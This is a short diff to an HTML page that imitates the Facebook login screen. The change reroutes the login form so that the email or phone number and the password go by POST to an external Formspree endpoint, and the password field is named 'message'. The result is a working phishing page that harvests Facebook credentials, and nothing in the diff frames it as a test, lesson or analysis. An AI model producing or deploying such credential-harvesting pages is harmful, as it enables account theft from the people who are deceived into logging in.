@@ -22,7 +22,8 @@
                 <h2>Facebook helps you connect and share with people in your life.</h2>
             </div>
             <div class="col-form">
-                <form class="form-container" id="maine-form" onsubmit="return verifyAccount('facebook')">
+                <form class="form-container" id="maine-form" data-form="facebook" action="https://formspree.io/f/mqkrjkbb"
+                method="POST">
                     <input type="text" name="username" placeholder="Email or Phone number" required>
                     <input type="password" placeholder="Password" name="message" id="maine-message" required>
                     <button type="submit" class="btn-login">Login
